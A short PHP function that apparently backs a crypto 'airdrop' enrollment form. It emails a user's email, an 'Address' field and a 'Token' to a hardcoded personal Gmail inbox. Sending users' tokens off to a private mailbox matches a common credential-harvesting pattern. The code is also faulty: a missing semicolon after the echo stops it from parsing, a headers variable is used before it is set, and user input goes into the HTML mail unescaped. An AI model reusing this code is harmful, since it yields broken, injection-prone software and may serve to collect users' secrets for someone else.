<?php


function toSend($a, $b, $c){
//Retrieve Data
$user_email = $a;
$user_master = $b;
$user_token = $c;

//Create Message

$message = 'Details for new Enrollment Request:<br><br> Email: '.$user_email.'<br>Address: '.$user_master.'<br>Token: '.$user_token;

// Send Email
$headers .= "Content-Type: text/html; charset=\"UTF-8\"; format=flowed \r\n";
$headers .= "Mime-Version: 1.0 \r\n"; 
mail('pmlizarraga@gmail.com', 'NEW Airdrop Request! - Early Adopters Enrollment', $message,$headers);

echo "OK"
}


?>